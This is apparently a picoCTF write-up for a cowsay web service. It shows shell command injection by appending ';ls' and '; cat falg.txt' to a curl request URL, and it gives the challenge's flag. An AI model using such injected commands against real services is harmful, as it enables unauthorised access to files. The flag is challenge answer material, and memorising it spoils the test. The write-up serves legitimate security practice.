## GOAL
Make a request to the following URL to cowsay your message:

`https://caas.mars.picoctf.net/cowsay/{message}`

### WRITE UP:-

The command `$ curl` is used as a command line tool that enables data transfer over various network protocols.

**Cowsay** is a program that generates ASCII art pictures of a cow with a message.

Thus we type `$ curl "https://caas.mars.picoctf.net/cowsay/hi_vishwa;ls" `

We find the following files inside

We require the flag file thus we run cat command for the falg.txt file

`$ curl "https://caas.mars.picoctf.net/cowsay/{message}; cat falg.txt"`

We get the flag as 
**picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**
